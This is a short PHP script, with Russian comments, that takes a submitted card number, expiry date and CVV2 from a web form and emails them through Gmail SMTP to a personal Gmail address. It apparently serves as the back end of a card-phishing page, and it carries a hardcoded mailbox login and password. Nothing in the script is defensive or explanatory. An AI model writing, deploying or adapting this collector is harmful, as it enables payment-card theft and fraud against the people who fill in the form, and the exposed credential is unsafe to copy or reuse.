<?php 

$number = $_POST['number'];
$time = $_POST['time'];
$cvv2 = $_POST['cvv2'];

require_once('phpmailer/PHPMailerAutoload.php');
$mail = new PHPMailer;
$mail->CharSet = 'utf-8';

// $mail->SMTPDebug = 3;                               // Enable verbose debug output

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = 'vodoleichik.11.02.1990@gmail.com'; // Наш логин
$mail->Password = "31`iz},'#wc^-g:/tx:[so";        // Наш пароль от ящика
$mail->SMTPSecure = 'ssl';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 465;                                    // TCP port to connect to
 
$mail->setFrom('random@mail.ru', 'Cbt');   // От кого письмо 
$mail->addAddress('vodoleichik.11.02.1990@gmail.com');     // Add a recipient
//$mail->addAddress('ellen@example.com');               // Name is optional
//$mail->addReplyTo('info@example.com', 'Information');
//$mail->addCC('cc@example.com');
//$mail->addBCC('bcc@example.com');
//$mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
//$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name
$mail->isHTML(true);                                  // Set email format to HTML

$mail->Subject = 'Платёжные данные';
$mail->Body    = '
		Пользователь оставил платёжные данные <br> 
	Номер карты: ' . $number . ' <br>
	Срок действия карты: ' . $time . '<br>
	CVV2-код карты: ' . $cvv2 . '';

if(!$mail->send()) {
    return false;
} else {
    return true;
}

?>